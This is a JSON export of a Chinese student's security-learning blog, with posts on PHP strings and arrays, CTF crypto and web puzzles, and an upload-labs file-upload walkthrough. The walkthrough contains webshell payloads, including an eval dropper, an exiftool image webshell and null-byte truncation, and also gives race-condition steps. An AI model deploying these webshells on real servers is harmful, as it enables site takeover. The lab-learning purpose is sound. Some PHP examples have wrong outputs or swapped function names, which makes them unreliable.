{"meta":{"title":"奇点的小屋！","subtitle":"Network security only","description":"hello，我是奇点！欢迎来到我的网安世界！","author":"奇点","url":"https://qidian-png.github.io","root":"/"},"pages":[{"title":"文章分类","date":"2020-05-11T02:16:43.000Z","updated":"2020-05-11T02:18:14.763Z","comments":true,"path":"categories/index.html","permalink":"https://qidian-png.github.io/categories/index.html","excerpt":"","text":""},{"title":"文章分类","date":"2020-05-11T02:21:50.000Z","updated":"2020-05-11T02:23:34.066Z","comments":true,"path":"tags/index.html","permalink":"https://qidian-png.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"暑假第四周练习(一)php学习--字符串处理(一)","slug":"暑假第四周练习(一)php学习--字符串处理","date":"2020-07-31T09:30:05.000Z","updated":"2020-07-31T12:53:59.841Z","comments":true,"path":"2020/07/31/暑假第四周练习(一)php学习--字符串处理/","link":"","permalink":"https://qidian-png.github.io/2020/07/31/%E6%9A%91%E5%81%87%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)php%E5%AD%A6%E4%B9%A0--%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/","excerpt":"","text":"#### 由于处理字符串的函数比较多，在这里只讲一部分！ 目录： 0×01 去除空白或其他字符函数 0×02 大小写转换函数 0×03 字符串替换函数 0×04 字符串查找函数 0×05 与html标签相关的函数 ​ 0×01 去除空白或其他字符函数 trim()函数是PHP中的一个内置函数，可以用于删除字符串左右两边的空格以及预定义字符。 用法： trim($string, $charlist) trim() 函数接受一个必需参数和一个可选参数 $string是必须参数，不可省略； $charlist参数为可选参数，可以省略不写，如果省略了，则会删除以下字符： 123456&quot;\\0&quot; - NULL&quot;\\t&quot; - 制表符&quot;\\n&quot; - 换行&quot;\\x0B&quot; - 垂直制表符&quot;\\r&quot; - 回车&quot; &quot; - 空格 实列： 12345&lt;?php$str &#x3D; &quot;Hello World!&quot;;echo trim($str, &quot;Hell!&quot;);&gt; 结果： o World 与其相关的函数： ltrim()函数：移除字符串左侧的空白字符或其他预定义字符。 rtrim()函数：除字符串右侧的空白字符或其他预定义字符。 0×02 大小写转换函数 strtolower() //将字符串转换为小写形式。strtoupper() //将字符串转换为大写形式。 看起来还挺像。 ①strtolower(): 该函数将传入的字符串参数所有的字符都转换成小写 示例： 123456&lt;?php $str &#x3D; &quot;I want To FLY&quot;; $str &#x3D; strtolower($str); echo $str;?&gt; 结果： 1i want to fly ②strtoupper(): 该函数的作用同strtolower函数相反,是将传入的字符参数的字符全部转换成大写。 示例： 123456&lt;?php $str &#x3D; &quot;i want to fly&quot;; $str &#x3D; strtolower($str); echo $str;?&gt; 结果： 1I want To FLY ③将字符串首字符转换成大写ucfirst(): 该函数的作用是将字符串的第一个字符改成大写,该函数返回首字符大写的字符串 12$str &#x3D; &#39;hello world!&#39;;$str&#x3D; ucwords($foo); &#x2F;&#x2F; Hello World! ④将字符串每个单词的首字符转换成大写 ucwords(): 该函数将传入的字符串的每个单词的首字符变成大写.如”hello world”,经过该函数处理后,将返回”Hello Word” 12$str &#x3D; &#39;hello world!&#39;;$str &#x3D; ucfirst($foo); &#x2F;&#x2F; Hello world! 0×03 字符串替换函数 定义：str_replace() 函数以其他字符替换字符串中的一些字符（区分大小写）。 str_ireplace() 函数执行不区分大小写的搜索。 语法： str_replace(find,replace,string,count) find 必需。规定要查找的值。replace 必需。规定替换 find 中的值的值。string 必需。规定被搜索的字符串。count 可选。对替换数进行计数的变量。 示例： 123&lt;?phpecho str_replace(&quot;world&quot;,&quot;Shanghai&quot;,&quot;Hello world!&quot;);?&gt; Hello world!就变成了Hello Shanghai！ 示例2： 123456&lt;?php$find &#x3D; array(&quot;Hello&quot;,&quot;world&quot;);$replace &#x3D; array(&quot;B&quot;);$arr &#x3D; array(&quot;Hello&quot;,&quot;world&quot;,&quot;!&quot;);print_r(str_replace($find,$replace,$arr));?&gt; 字符串被替换成了B Array ( [0] =&gt; B [1] =&gt; [2] =&gt; ! ) 0×04 字符串查找函数 ①substr_count函数substr_count() 函数计算子串在字符串中出现的次数(区分大小写)。 语法： substr_count(string,substring,start,length) string 必需。规定被检查的字符串。substring 必需。规定要搜索的字符串。start 可选。规定在字符串中何处开始搜索。length 可选。规定搜索的长度。 示例1： 12345678&lt;?php$str &#x3D; &quot;This is nice&quot;;echo strlen($str).&quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 使用 strlen() 来返回字符串长度echo substr_count($str,&quot;is&quot;).&quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 字符串中 &quot;is&quot; 出现的次数echo substr_count($str,&quot;is&quot;,2).&quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 字符串缩减为 &quot;is is nice&quot;echo substr_count($str,&quot;is&quot;,3).&quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 字符串缩减为 &quot;s is nice&quot;echo substr_count($str,&quot;is&quot;,3,3).&quot;&lt;br&gt;&quot;; &#x2F;&#x2F; 字符串缩减为 &quot;s i&quot;?&gt; 结果： 12345122210 示例2： 1234&lt;?php$str &#x3D; &quot;abcabcab&quot;;echo substr_count($str,&quot;abcab&quot;); ?&gt; 这个函数不会对重叠的子字符串计数 ②strpos() 函数定义：strpos() 函数查找字符串在另一字符串中第一次出现的位置。语法： strpos(string,find,start) string 必需。规定要搜索的字符串。find 必需。规定要查找的字符串。start 可选。规定在何处开始搜索。 12345678910$str&#x3D;&#39;testteste&#39;; var_dump(strpos($str, &#39;t1&#39;)); if(strpos($str, &#39;t&#39;)&#x3D;&#x3D;&#x3D;false)&#123; echo &#39;没找到！&#39;; &#125;else&#123; echo &#39;找到啦!&#39;; &#125; $str&#x3D;&#39;testteste&#39;; var_dump(strpos($str, &#39;t&#39;,1)); ③strstr函数定义：strstr() 函数搜索字符串在另一字符串中的第一次出现。语法： 1strstr(string,search,before_search) string 必需。规定被搜索的字符串。 search 必需。规定所搜索的字符串。如果此参数是数字，则搜索匹配此数字对应的 ASCII 值的字符。 before_search 可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 search 参数第一次出现之前的字符串部分。 示例1： 123&lt;?phpecho strstr(&quot;Hello world!&quot;,111);?&gt; 111ASCII码表对应 o ,搜索 o 并且返回字符串的剩余部分： 示例2： 123&lt;?phpecho strstr(&quot;Hello world!&quot;,&quot;world&quot;,true);?&gt; 返回world之前的字符。Hello ! 0×05 字符串截取函数 定义：substr() 函数返回字符串的一部分。语法： substr(string,start,length) 注意：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 12345678910string 必需。规定要返回其中一部分的字符串。start 必需。规定在字符串的何处开始。正数 - 在字符串的指定位置开始负数 - 在从字符串结尾开始的指定位置开始0 - 在字符串中的第一个字符处开始length 可选。规定被返回字符串的长度。默认是直到字符串的结尾。正数 - 从 start 参数所在的位置返回的长度负数 - 从字符串末端返回的长度 示例1： 1234567891011&lt;?phpecho substr(&quot;Hello world&quot;,10).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,1).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,3).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,7).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-1).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-10).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-8).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-4).&quot;&lt;br&gt;&quot;;?&gt; 结果： 12345678dello worldlo worldorlddello worldlo worldorld 示例2： 1234567891011&lt;?phpecho substr(&quot;Hello world&quot;,0,10).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,1,8).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,0,5).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,6,6).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,0,-1).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-10,-2).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,0,-6).&quot;&lt;br&gt;&quot;;echo substr(&quot;Hello world&quot;,-2-3).&quot;&lt;br&gt;&quot;;?&gt; 结果： 12345678Hello worlello worHelloworldHello worlello worHelloworld 0×06 字符串分割函数 explode() 函数 定义：explode() 函数把字符串打散为数组。 语法： explode(separator,string,limit) 123456789separator 必需。规定在哪里分割字符串。string 必需。要分割的字符串。limit 可选。规定所返回的数组元素的数目。可能的值：大于 0 - 返回包含最多 limit 个元素的数组小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组0 - 返回包含一个元素的数组","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第三周练习(二)Crypto练习(一)","slug":"暑假第三周练习(二)Crypto 练习(一)","date":"2020-07-25T03:46:05.000Z","updated":"2020-07-31T12:57:16.576Z","comments":true,"path":"2020/07/25/暑假第三周练习(二)Crypto 练习(一)/","link":"","permalink":"https://qidian-png.github.io/2020/07/25/%E6%9A%91%E5%81%87%E7%AC%AC%E4%B8%89%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%BA%8C)Crypto%20%E7%BB%83%E4%B9%A0(%E4%B8%80)/","excerpt":"","text":"肝！ 题目来源：BUUCTF 目录： 0×01 MD50×02 url编码0×03 看我回旋踢0×04 一眼就解密0×05 摩丝0×06 [BJDCTF 2nd]签到0×07 password0×08 变异凯撒 0×01 MD5 下载附件，打开是一串字符e00cf25ad42683b3df678c61f42c6bda，根据题目提示MD5提示，可以猜是MD5函数加密。 提交的时候加上flag就是答案。 0×02 url编码 下载附件得到一串符号%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d,一看是URL加密，打开火狐浏览器，里面有url加密解密。 这样会得到flag。 0×03 看我回旋踢 下载附件仍是遗传字符synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}，觉得应该是凯撒密码但是偏移量不知道，只能一个一个试，到偏移量为13时就找到了flag。 0×04 一眼就解密 既有大写又有小写，还有=，看一眼就知道是base64。果然是一眼就解密！ 0×05 摩丝 拿到附件一脸懵逼，看了内容，笑了.. .-.. --- ...- . -.-- --- ..-，摩斯密码。flag{ILOVEYOU} 0×06 [BJDCTF 2nd]签到 下面是base64，上面的数字没搞懂，然后直接解密，就得到flag。上面的数字没有用。 0×07 password 弱口令猜测：zs19900315 0×08 变异凯撒 因为有下划线就不能是字母的变换了，可能是ascll码表。由afZ_ ===&gt;&gt;&gt; flag偏移量就是n+4,从而就能得到flag。 0×09 Quoted-printable Quoted-printable是一种编码方式，文件内容=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6 找个解密网站就行了，字符格式utf8编码。0×10 Rabbit 也是一种编码方式，网上找在线解密。flag到手。 0×11 篱笆墙的影子 栅栏密码？ 试了好大一会，才得到flag，笨方法。 0×12 RSA 以前就听说过RSA，这也是第一次见。 这就需要用的我们的神器 RSA-Tool 2 e在十进制17，工具里十六进制为11。得到的数，加上noxCTF{}，应该就是答案，但是提交了还是不对。","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"Crypto学习","slug":"Crypto学习","permalink":"https://qidian-png.github.io/tags/Crypto%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第三周练习(一)PHP学习(六)--数组基础","slug":"暑假第三周练习(一)PHP学习(六)--数组基础及进阶","date":"2020-07-21T04:35:05.000Z","updated":"2020-07-31T13:10:50.329Z","comments":true,"path":"2020/07/21/暑假第三周练习(一)PHP学习(六)--数组基础及进阶/","link":"","permalink":"https://qidian-png.github.io/2020/07/21/%E6%9A%91%E5%81%87%E7%AC%AC%E4%B8%89%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)PHP%E5%AD%A6%E4%B9%A0(%E5%85%AD)--%E6%95%B0%E7%BB%84%E5%9F%BA%E7%A1%80%E5%8F%8A%E8%BF%9B%E9%98%B6/","excerpt":"","text":"学习ing！目录：0×01 数组的分类0×02 数组的创建0×03 遍历数组0×04 预定义超全局数组 0×01 数组的分类 分为两种数组索引数组和关联数组 数组的名称为整形时是索引数组，为字符串类型时是关联数组。 0×02 数组的创建 php定义数组时，不需要提前声明，不需要定义大小，直接创建，使用array()创建。数组输出需要使用print_r()函数，或者var_dump()函数。 方法一：直接为数组元素赋值即可创建。 123$stduent[0]&#x3D;12$student[1]&#x3D;&#39;hello&#39;$student[2]&#x3D;&#39;false&#39; 当然索引值可以是整数也可以是字符串，也可以不写，不写索引值默认是 索引数组，从0开始 方法二： 变量名称=array(数据,数据，。。。);不写索引值默认是 索引数组，从0开始，自动分配。 1$student&#x3D;array(10,&quot;你好&quot;，66.66，true)； 方法三：变量名称=array( 索引值=&gt;数据, ………. ); 123456789101112131415161718192021&lt;?php&#x2F;&#x2F;$student&#x3D;array(索引值&#x3D;&gt;具体的值,.......);$student&#x3D;array(10,&#39;孙胜利&#39;,true,60.5);&#x2F;&#x2F;一维数组var_dump($student);$student1&#x3D;array( 0&#x3D;&gt;10, 1&#x3D;&gt;&#39;你好&#39;, 2&#x3D;&gt;true, 3&#x3D;&gt;60.5);var_dump($student1);$student2&#x3D;array( &#39;num&#39;&#x3D;&gt;11, &#39;name&#39;&#x3D;&gt;&#39;你好&#39;, &#39;sex&#39;&#x3D;&gt;true, &#39;grade&#39;&#x3D;&gt;80.5, 10&#x3D;&gt;&#39;dqwdwqdwq&#39;);var_dump($student2);?&gt; 需要调用数组里的某一个值的方法：echo 数组变量名称[索引值] 数据里面还可放数组类型的数据，同一个数组中存储任何类型的数据（类似于C语言的二维数组） 多维数组： 访问数值的方法 变量名称[索引值][索引值]…. 123456789101112131415161718&lt;?php &#x2F;&#x2F;二维数组,多维数组$students&#x3D;array( 0&#x3D;&gt;array(1,&#39;你&#39;,true,60.5), 1&#x3D;&gt;array(2,&#39;好&#39;,true,80.5), 2&#x3D;&gt;array(3,&#39;啊&#39;,false,85.5));&#x2F;*$students&#x3D;array( array(1,&#39;你&#39;,true,60.5), array(2,&#39;好&#39;,true,80.5), array(3,&#39;啊&#39;,false,85.5));*&#x2F;var_dump($students);echo $students[0][1];?&gt; 0×03 遍历数组 类似于其他语言的循环。 注意：count(数组[,1])返回数组里面数据的个数,还可以获取多维数组的个数 ,当然一般我们只传一个数组进去就可以了 ①用for语句来遍历数组 1234567$arr&#x3D;array( &#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;);for($i&#x3D;0;$i&lt;count($arr);$i++)&#123; echo $arr[$i];&#125; 数组元素数量为6 ，输出结果是abcdef。 123456$arr1&#x3D;array( array(1,2,3), array(4,5,6));echo count($arr1);*&#x2F; 这样只会输出第一层的数组，数量为2。 如果我们要输出这个数组的全部的个数，应该怎样？ 12345$arr1&#x3D;array( array(1,2,3), array(4,5,6));echo count($arr1,1);&#x2F;&#x2F;2+6&#x3D;8 这样就可以输出第一层有2个元素，第二层有6个元素，所以总共有8种元素。 for循环的缺点：只适合索引数组，不适合关联数组，但是关联数组在php语言中应用非常广泛，所以for循环用的比较少 ②foreach语句遍历数据 1）foreach(数组变量 as 变量1){ //每次循环执行的语句 变量1代表当前正在经历（访问）的数据 } 123456789&lt;?php $arr1&#x3D;array( &#39;name&#39;&#x3D;&gt;&#39;你好&#39;, &#39;num&#39;&#x3D;&gt;10);foreach($arr1 as $value)&#123; echo $value.&#39;&lt;br &#x2F;&gt;&#39;;&#125;?&gt; 2）foreach(数组变量 as 变量1=&gt;变量2){ //每次循环执行的语句 变量1代表当前正在经历（访问）的数据的索引值 变量1代表当前正在经历（访问）的数据 } 1234567891011&lt;?php $arr1&#x3D;array( &#39;name&#39;&#x3D;&gt;&#39;孙胜利&#39;, &#39;num&#39;&#x3D;&gt;10);foreach($arr1 as $key&#x3D;&gt;$value)&#123; echo $key.&#39;&#x3D;&gt;&#39;.$value.&#39;&lt;br &#x2F;&gt;&#39;;&#125;?&gt; 如何遍历多维数组？递归怎么样？ foreach里面再套一个foreach! 1234567891011121314&lt;?php$arr&#x3D;array( &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, array( 1,2,3,4,5 ));foreach ($arr as $val)&#123; var_dump($val);&#125;?&gt; 这个就可以。但是，我们应该怎样访问array( 1,2,3,4,5 ) 这个数组？？？ 123456789101112131415161718&lt;?php$arr&#x3D;array( &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, array( 1,2,3,4,5 ));foreach ($arr as $val1)&#123; foreach ($val1 as $val2)&#123; echo $val2.&#39;&lt;br &#x2F;&gt;&#39;; &#x2F;&#x2F;var_dump($val2); &#125;&#125; ?&gt; 这样应该就行了。 例子： 1234567891011121314151617181920&lt;?php&#x2F;* * 总结的案例 * *&#x2F;$students&#x3D;array( array(&#39;你&#39;,1,true,60.5), array(&#39;我&#39;,2,true,80.5), array(&#39;他&#39;,3,false,85.5));echo &#39;&lt;table border&#x3D;1&gt;&#39;;foreach ($students as $val)&#123; if($val[2]&#x3D;&#x3D;&#x3D;true)&#123; $val[2]&#x3D;&#39;男&#39;; &#125;else&#123; $val[2]&#x3D;&#39;女&#39;; &#125; echo &quot;&lt;tr&gt;&lt;td&gt;&#123;$val[0]&#125;&lt;&#x2F;td&gt;&lt;td&gt;&#123;$val[1]&#125;&lt;&#x2F;td&gt;&lt;td&gt;&#123;$val[2]&#125;&lt;&#x2F;td&gt;&lt;td&gt;&#123;$val[3]&#125;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&quot;;&#125;echo &#39;&lt;&#x2F;table&gt;&#39;;?&gt; 0×04 预定义超全局数组 已经定义好了（存在）的变量(存放的数据的类型是数组)。 超全局：超级全局变量，作用域（有效区域）！就类似于c语言里头文件包含的函数可以让我们在全局任意位置使用！ 超全局变量一是有全局变量的特性，而是无须声明直接使用。（系统创建及维护） 预定义超全局变量共有九个： 123456789$_GET$_POST$_REQUEST$_SERVER$_ENV$_FILES$_COOKIE$_SESSION$GLOBALS ①get方式比如 ?参数名=参数值&amp;参数名=参数值…… http://127.0.0.1/demo5_3/index.php?参数名=参数值 在服务器端（请求的php文件这边）可以通过$_GET来获取到 $_GET索引值为参数名，索引值对应的数据就是参数值 但是GET的内容会出现在URL框里，所以不是很安全 ②post方式比如表单 post发送过来的！ 可以通过$_POST来获取到! POST方式和GET方式的区别： POST方式安全性好数据传输大小（POST方式大）保存到收藏夹（GET方式） ③$_REQUEST作用: $_REQUEST 主要包含包含 $ _GET 、$_POST、 $_COOKIE数组的信息。注意不要经常使用 $ _REQUEST（因为将多个信息混合）。通过$_SERVER[‘REQUEST_METHOD’]区分GET和POST④ $ _SERVER主要包含了http请求行和消息头的信息，同时还有服务器的一些信息（DOCUMENT_ROOT，SCRIPT_FILENAME…）。⑤获取服务器端的环境变量，通过修改php.ini的variables_order=”EGPCS”启动。⑥包含了全部变量的全局组合数组。当定义一个全局变量，也会被$GLOBALS管理。 11111！！！！！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"php学习","slug":"php学习","permalink":"https://qidian-png.github.io/tags/php%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第二周练习(二)web学习(一)","slug":"暑假第二周练习(二)web学习(一)","date":"2020-07-17T11:18:05.000Z","updated":"2020-07-31T12:58:00.340Z","comments":true,"path":"2020/07/17/暑假第二周练习(二)web学习(一)/","link":"","permalink":"https://qidian-png.github.io/2020/07/17/%E6%9A%91%E5%81%87%E7%AC%AC%E4%BA%8C%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%BA%8C)web%E5%AD%A6%E4%B9%A0(%E4%B8%80)/","excerpt":"","text":"平常练习，总结一下！ 题目来源：bugkuCTF平台 0×01 web20×02 计算器0×03 web基础GET0×04 web基础$_POST0×05 矛盾0×06 web30×07 域名解析0×08 你必须让他停下 0×01 web2 打开链接就花了很长时间这是个动图，而且越来越快。顿时就没了思路，查看源代码，用F12就找到了flag。 0×02 计算器习惯的输入正确答案。但只能输入一个数字，经过上题，这次直接打开F12查看代码。可输入的最大长度为1，那我们在前端改一下，输入正确答案拿到flag。 0×03 web基础$_GET 拿到题 what这个参数是用get请求来接收值，get请求的参数赋值可以在页面的url中直接进行。 0×04 web基础$_POST 与上道题不同的是这是POST方式提交的。我们可以用火狐里的post data(聪明如我) 0×05 矛盾 第一个if语句里 is_numeric() 函数用于检测变量是否为数字或数字字符串。但是第二个if语句num==1,这就有点矛盾。但是方法有很多比如我突发奇想 num=1%00 0×06 web3点F12打开页面裂开了，没了思路去百度！发现-&amp;#75;&amp;#69;&amp;#89;&amp;#123;&amp;#74;&amp;#50;&amp;#115;&amp;#97;&amp;#52;&amp;#50;&amp;#97;&amp;#104;&amp;#74;&amp;#75;&amp;#45;&amp;#72;&amp;#83;&amp;#49;&amp;#49;&amp;#73;&amp;#73;&amp;#73;&amp;#125这是URL解析，复制到txt文本内，改格式为html,然后就可以拿到flag了。 0×07 域名解析 提示：听说把 flag.baidu.com 解析到123.206.87.240 就能拿到flag 第一次见，没点头绪。看大佬博客就明白了，就是在电脑的host文件内 C:\\Windows\\System32\\drivers\\etc 将123.206.87.240 flag.baidu.com放在最后一行进行解析，我们可以访问了。 0×08 你必须让他停下 怎么才能停下来？页面一直刷新，F12也看不了。bp看一下 9.jpg的时候flag is here。让他不停刷新，当如果是10.jpg的时候服务器的响应报文中有flag 虽然这些都是基础，对我来说真的很费劲！加油！","categories":[{"name":"技术","slug":"技术","permalink":"https://qidian-png.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://qidian-png.github.io/tags/web%E5%AD%A6%E4%B9%A0/"}]},{"title":"暑假第二周练习(一)文件上传漏洞(二)","slug":"暑假第二周练习(一)文件上传漏洞(二)","date":"2020-07-16T01:57:05.000Z","updated":"2020-07-31T13:08:37.562Z","comments":true,"path":"2020/07/16/暑假第二周练习(一)文件上传漏洞(二)/","link":"","permalink":"https://qidian-png.github.io/2020/07/16/%E6%9A%91%E5%81%87%E7%AC%AC%E4%BA%8C%E5%91%A8%E7%BB%83%E4%B9%A0(%E4%B8%80)%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E(%E4%BA%8C)/","excerpt":"","text":"继续总结，烧脑！ 目录： 0×01：白名单限制 0×02：内容限制 0×03：竞争条件 0×01 白名单限制 指名单内都是允许上传的格式。但是试验前，我们需要在php.ini里关闭magic_quotes_gpc函数。常见的的截断：%00截断 和 0×00截断 在upload-labs的第12关里，先看一下源码： 123456789101112131415161718$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext &#x3D; substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path &#x3D; $_GET[&#39;save_path&#39;].&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &#39;上传出错！&#39;; &#125; &#125; else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; &#125;&#125; 在 ：$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;img_path是拼接而成的，我们可以使用截断。因为是GET方式所以我们用%00截断。因为get传参 的参数 会被 服务器进行URL解码，%00被URL解码之后就是ascii 0。抓包。在这里进行%00截断上传成功。 而靶场的第13关，提交的方式为POST，post不会像get对%00进行自动解码，所以需要在16进制中进行修改00。在然后在Hex中查看机器码这样就截断成功了。 0×02 内容限制 查看源码： 12345678910111213141516171819202122232425262728293031323334353637383940function getReailFileType($filename)&#123; $file &#x3D; fopen($filename, &quot;rb&quot;); $bin &#x3D; fread($file, 2); &#x2F;&#x2F;只读2字节 fclose($file); $strInfo &#x3D; @unpack(&quot;C2chars&quot;, $bin); $typeCode &#x3D; intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;]); $fileType &#x3D; &#39;&#39;; switch($typeCode)&#123; case 255216: $fileType &#x3D; &#39;jpg&#39;; break; case 13780: $fileType &#x3D; &#39;png&#39;; break; case 7173: $fileType &#x3D; &#39;gif&#39;; break; default: $fileType &#x3D; &#39;unknown&#39;; &#125; return $fileType;&#125;$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_type &#x3D; getReailFileType($temp_file); if($file_type &#x3D;&#x3D; &#39;unknown&#39;)&#123; $msg &#x3D; &quot;文件未知，上传失败！&quot;; &#125;else&#123; $img_path &#x3D; UPLOAD_PATH.&quot;&#x2F;&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload &#x3D; true; &#125; else &#123; $msg &#x3D; &quot;上传出错！&quot;; &#125; &#125;&#125; 检测原理：通过检测文件的前两个字节判断文件类型，满足即可上传。我们可以直接上传图片马。图片吗制作方法：copy normal.jpg /b + shell.php /a webshell.jpg 或者 exiftool -Comment=&#39;&lt;?php echo &quot;&lt;pre&gt;&quot;; system($_GET[&#39;cmd&#39;]); ?&gt;&#39; 1.jpg 用方法一制作， 查看图像给的路径却连不上去， 123456789101112&lt;?php&#x2F;*本页面存在文件包含漏洞，用于测试图片马是否能正常运行！*&#x2F;header(&quot;Content-Type:text&#x2F;html;charset&#x3D;utf-8&quot;);$file &#x3D; $_GET[&#39;file&#39;];if(isset($file))&#123; include $file;&#125;else&#123; show_source(__file__);&#125;?&gt; 在include.php里，对我们传的文件进行PHP解析。所以我我们需要把路径改一下， 这个需要结合文件包含漏洞，连接成功。 0×03 竞争条件 文件上传过程 竞争条件原理网站逻辑：1、网站允许上传任意文件，然后检查上传文件是否包含webshell,如果包含删除该文件。2、网站允许上传任意文件，但是如果不是指定类型，那么使用unlink删除文件。文件上传成功后和删除文件之间存在短的时间差。攻击者可以利用这个时间差完成竞争条件的上传漏洞攻击。并行服务器会并发执行多个线程，这就给了不法分子用条件竞争来绕过防护的机会。 攻击者先上传一个图片马shell.php,shell.php的内容是生成另一个图片马webshell.php。shell.php的代码内容： 123&lt;?phpfputs(fopen(&#39;..&#x2F;webshell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;a&#39;]);?&gt;&#39;);?&gt; 通过写的方式将写近webshell.php。这就利用时间差上传了webshell。 靶场第18关源码展示： 1234567891011121314151617181920212223$is_upload &#x3D; false;$msg &#x3D; null;if(isset($_POST[&#39;submit&#39;]))&#123; $ext_arr &#x3D; array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_name &#x3D; $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $temp_file &#x3D; $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_ext &#x3D; substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path &#x3D; UPLOAD_PATH . &#39;&#x2F;&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload &#x3D; true; &#125;else&#123; $msg &#x3D; &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); &#125; &#125;else&#123; $msg &#x3D; &#39;上传出错！&#39;; &#125;&#125; 我们先上传一个文件看其被存起来的路径。现在我们只需要，上传1.php，用burpsuit 拦截数据包，然后将数据包放在burpsuit的爆破模块中。然后访问http://localhost/upload-labs/upload/shell.php同样，将请求拦截，放在burpsuit的爆破模块中。最后，在爆破模块中，让两者同时不断进行，等待那关键的一瞬间就可以了。具体操作：1.对两者都进行抓包，右键，send to intruder2.首先 clear $ ,然后在payload中选择 Nullpayload，然后设置Generate 10000表示没有payload，上传一万次，然后在Option中，设置Number of thread线程数为200 武侠中高手对决，输赢只在一刹那。 在那短短的一刹那，假如你上传的文件，是个 大马套小马呢？大马虽死，但同源文件夹中，小马犹生。一个网站便在弹指一挥间被拿下了。 但是这个需要用到多线程burp suite专业版才会有多线程，我们还需要下载专业版。肝了n个小时。。。还是没成功🤔🤔🤔🤔🤔🤔 